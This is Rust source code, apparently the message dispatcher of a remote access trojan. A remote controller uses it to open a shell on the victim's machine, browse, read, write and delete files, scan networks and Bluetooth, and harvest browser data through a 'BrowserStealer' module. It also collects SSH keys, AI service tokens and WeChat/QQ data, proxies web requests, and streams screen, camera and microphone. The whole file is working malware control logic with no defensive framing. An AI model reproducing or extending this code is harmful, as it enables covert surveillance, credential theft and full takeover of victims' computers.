use libra_common::protocol::{WebSocketMessage, ws_type};
use libra_comm::ws::WsSender;
use libra_platform::get_executor;

use super::AgentEngine;
use super::shell::{ShellSession, bind_shell, handle_shell_input, unbind_shell};
use super::streams::{start_camera_stream, start_screen_stream};
use super::utils::{blocking_string, blocking_val, data_str, data_u64, ws_send};

impl AgentEngine {
    // ── WS message dispatch ──────────────────────────────────────────

    pub(crate) async fn handle_ws_message(
        &mut self,
        msg: WebSocketMessage,
        tx: &WsSender,
        shell_tx: &tokio::sync::mpsc::UnboundedSender<WebSocketMessage>,
        shell_session: &mut Option<ShellSession>,
    ) {
        let agent_id = self.agent_id.clone();
        let msg_type = msg.msg_type.clone();
        let data = msg.data.clone();
        let rid = msg.request_id.clone();
        let rid = rid.as_deref();

        match msg_type.as_str() {
            // ── Shell ────────────────────────────────────────────
            ws_type::SHELL_BIND => {
                bind_shell(&agent_id, tx, shell_tx, shell_session, &data, rid).await;
            }
            ws_type::SHELL_UNBIND => {
                unbind_shell(&agent_id, tx, shell_session, rid).await;
            }
            ws_type::SHELL_INPUT => {
                handle_shell_input(shell_session, &data, shell_tx, &agent_id).await;
            }

            // ── File operations ──────────────────────────────────
            ws_type::FILE_DRIVES => {
                let drives = blocking_val(|| {
                    let executor = get_executor();
                    executor.get_drives()
                }).await;
                let escaped: Vec<String> = drives.iter()
                    .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                    .collect();
                let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
                ws_send(tx, &agent_id, "file.drives.result", &json, rid).await;
            }
            ws_type::FILE_LIST => {
                let path = data_str(&data, "path", ".");
                let offset = data_u64(&data, "offset", 0) as usize;
                let limit = data_u64(&data, "limit", 200) as usize;
                let r = blocking_string(move || {
                    libra_modules::execution::FileOps::list_directory_paged(&path, offset, limit)
                })
                .await;
                ws_send(tx, &agent_id, "file.list.result", &r, rid).await;
            }
            ws_type::FILE_READ => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::read_file(&path)).await;
                ws_send(tx, &agent_id, "file.read.result", &r, rid).await;
            }
            ws_type::FILE_OPEN => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::open_file(&path)).await;
                ws_send(tx, &agent_id, "file.open.result", &r, rid).await;
            }
            ws_type::FILE_WRITE => {
                let path = data_str(&data, "path", "");
                let content = data_str(&data, "data", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::write_file(&path, &content)).await;
                ws_send(tx, &agent_id, "file.write.result", &r, rid).await;
            }
            ws_type::FILE_DELETE => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::delete(&path)).await;
                ws_send(tx, &agent_id, "file.delete.result", &r, rid).await;
            }
            ws_type::FILE_MKDIR => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::create_directory(&path)).await;
                ws_send(tx, &agent_id, "file.mkdir.result", &r, rid).await;
            }
            ws_type::FILE_RENAME => {
                let path = data_str(&data, "path", "");
                let new_name = data_str(&data, "newName", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::rename(&path, &new_name)).await;
                ws_send(tx, &agent_id, "file.rename.result", &r, rid).await;
            }
            ws_type::FILE_MOVE => {
                let src = data_str(&data, "source", "");
                let dst = data_str(&data, "destination", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::move_path(&src, &dst)).await;
                ws_send(tx, &agent_id, "file.move.result", &r, rid).await;
            }
            ws_type::FILE_COPY => {
                let src = data_str(&data, "source", "");
                let dst = data_str(&data, "destination", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::copy(&src, &dst)).await;
                ws_send(tx, &agent_id, "file.copy.result", &r, rid).await;
            }
            ws_type::FILE_COMPRESS => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::compress(&path)).await;
                ws_send(tx, &agent_id, "file.compress.result", &r, rid).await;
            }
            ws_type::FILE_DECOMPRESS => {
                let path = data_str(&data, "path", "");
                let dest: Option<String> = data.as_ref()
                    .and_then(|d| d["destination"].as_str())
                    .map(|s| s.to_string());
                let r = blocking_string(move || libra_modules::execution::FileOps::decompress(&path, dest.as_deref())).await;
                ws_send(tx, &agent_id, "file.decompress.result", &r, rid).await;
            }
            ws_type::FILE_SHORTCUT => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::create_shortcut(&path)).await;
                ws_send(tx, &agent_id, "file.shortcut.result", &r, rid).await;
            }
            ws_type::FILE_ARCHIVE_LIST => {
                let path = data_str(&data, "path", "");
                let r = blocking_string(move || libra_modules::execution::FileOps::list_archive(&path)).await;
                ws_send(tx, &agent_id, "file.archive_list.result", &r, rid).await;
            }

            // ── System info ──────────────────────────────────────
            ws_type::SYSTEM_PROCESSES => {
                let r = blocking_string(move || libra_modules::recon::ProcessInfo::collect(None)).await;
                ws_send(tx, &agent_id, "system.processes.result", &r, rid).await;
            }
            ws_type::SYSTEM_WINDOWS => {
                let r = blocking_string(move || libra_modules::recon::WindowInfo::collect()).await;
                ws_send(tx, &agent_id, "system.windows.result", &r, rid).await;
            }
            ws_type::SYSTEM_ENV => {
                let r = blocking_string(move || libra_modules::recon::EnvInfo::collect()).await;
                ws_send(tx, &agent_id, "system.env.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK => {
                let r = libra_modules::recon::NetworkInfo::collect().await;
                ws_send(tx, &agent_id, "system.network.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_WAN => {
                let r = libra_modules::recon::NetworkInfo::collect_wan_only().await;
                ws_send(tx, &agent_id, "system.network.wan.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_WIFI => {
                let r = libra_modules::recon::NetworkInfo::collect_wifi_only();
                ws_send(tx, &agent_id, "system.network.wifi.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_NEARBY => {
                let r = libra_modules::recon::NetworkInfo::collect_nearby_wifi_only();
                ws_send(tx, &agent_id, "system.network.nearby.result", &r, rid).await;
            }
            ws_type::SYSTEM_NETWORK_PROXY => {
                let r = libra_modules::recon::NetworkInfo::collect_proxy_only();
                ws_send(tx, &agent_id, "system.network.proxy.result", &r, rid).await;
            }
            ws_type::SYSTEM_LANSCAN => {
                let r = libra_modules::recon::LanScan::scan().await;
                ws_send(tx, &agent_id, "system.lanscan.result", &r, rid).await;
            }
            ws_type::SYSTEM_BLUETOOTH => {
                let r = libra_modules::recon::BluetoothScanner::scan().await;
                ws_send(tx, &agent_id, "system.bluetooth.result", &r, rid).await;
            }

            // ── Other software ────────────────────────────────────
            ws_type::OTHERSOFT_WECHAT => {
                let r = libra_modules::recon::OtherSoftware::collect_wechat();
                ws_send(tx, &agent_id, "othersoft.wechat.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_QQ => {
                let r = libra_modules::recon::OtherSoftware::collect_qq();
                ws_send(tx, &agent_id, "othersoft.qq.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_BROWSER => {
                let btype = data_str(&data, "type", "all");
                let offset = data_u64(&data, "offset", 0) as usize;
                let limit = data_u64(&data, "limit", 100) as usize;
                let r = libra_modules::recon::BrowserStealer::collect(&btype, offset, limit);
                ws_send(tx, &agent_id, "othersoft.browser.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_BROWSER_SEARCH => {
                let btype = data_str(&data, "type", "all");
                let keyword = data_str(&data, "keyword", "");
                let r = libra_modules::recon::BrowserStealer::search(&btype, &keyword);
                ws_send(tx, &agent_id, "othersoft.browser.search.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_AI => {
                let r = libra_modules::recon::AITokenScanner::scan();
                ws_send(tx, &agent_id, "othersoft.ai.result", &r, rid).await;
            }
            ws_type::OTHERSOFT_SSH => {
                let r = libra_modules::recon::SshKeys::collect();
                ws_send(tx, &agent_id, "othersoft.ssh.result", &r, rid).await;
            }

            // ── Proxy ─────────────────────────────────────────────
            ws_type::PROXY_FETCH => {
                let url = data_str(&data, "url", "");
                let method = data_str(&data, "method", "GET");
                let headers = data.as_ref().and_then(|d| d["headers"].as_str());
                let body = data.as_ref().and_then(|d| d["body"].as_str());
                let r = libra_modules::execution::ProxyBrowser::fetch(
                    &url, &method, headers, body,
                ).await;
                ws_send(tx, &agent_id, "proxy.fetch.result", &r, rid).await;
            }

            // ── Screen ─────────────────────────────────────────
            ws_type::SCREEN_LIST => {
                let r = libra_modules::execution::ScreenCapture::list_screens();
                ws_send(tx, &agent_id, "screen.list.result", &r, rid).await;
            }
            ws_type::SCREEN_BIND => {
                start_screen_stream(&self, data, agent_id.clone(), tx.clone()).await;
                ws_send(tx, &agent_id, "screen.bind.result", r#"{"status":"streaming"}"#, rid).await;
            }
            ws_type::SCREEN_UNBIND => {
                if let Some(tx) = self.screen_session.lock().unwrap().take() {
                    let _ = tx.send(true);
                }
                ws_send(tx, &agent_id, "screen.unbind.result", r#"{"status":"ok"}"#, rid).await;
            }
            ws_type::SCREEN_CONFIG => {
                start_screen_stream(&self, data, agent_id.clone(), tx.clone()).await;
            }
            ws_type::CAMERA_LIST => {
                let r = libra_modules::execution::CameraCapture::list_cameras();
                ws_send(tx, &agent_id, "camera.list.result", &r, rid).await;
            }
            ws_type::CAMERA_BIND | ws_type::CAMERA_CONFIG => {
                start_camera_stream(&self, data, agent_id.clone(), tx.clone(), rid).await;
            }
            ws_type::CAMERA_UNBIND => {
                if let Some(cancel) = self.camera_session.lock().unwrap().take() {
                    cancel.store(true, std::sync::atomic::Ordering::Relaxed);
                }
                ws_send(tx, &agent_id, "camera.unbind.result", r#"{"status":"ok"}"#, rid).await;
            }
            ws_type::MIC_LIST => {
                let r = libra_modules::execution::MicCapture::list_devices();
                ws_send(tx, &agent_id, "mic.list.result", &r, rid).await;
            }
            ws_type::MIC_BIND => {
                let idx = data_u64(&data, "deviceIndex", 0) as u32;
                let r = libra_modules::execution::MicCapture::start_capture(idx);
                ws_send(tx, &agent_id, "mic.data", &r, rid).await;
            }
            ws_type::MIC_UNBIND => {
                let r = libra_modules::execution::MicCapture::stop_capture();
                ws_send(tx, &agent_id, "mic.unbind.result", &r, rid).await;
            }

            _ => {} // Unknown type — ignore
        }
    }
}
